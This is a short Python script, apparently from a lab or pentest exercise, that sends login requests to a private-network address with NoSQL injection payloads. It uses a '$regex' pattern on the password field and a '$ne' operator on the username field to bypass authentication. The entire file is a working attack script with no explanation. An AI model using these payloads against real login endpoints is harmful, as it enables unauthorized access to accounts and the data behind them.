import requests

url = "http://192.168.86.50:9000/login"
headers = {"Content-Type": "application/json"}


data = {"username": "admin", "password": "pass"}
data = {"username": "admin", "password": {"$regex": "^p"}}
data = {"username": {"$ne": ""}, "password": "pass"}

print(f"Sending request to {url} with data: {data}")
response = requests.post(url, json=data, headers=headers)

if response.status_code == 200:
    print(response.json())
else:
    print(f"Error: {response.status_code}, {response.text}")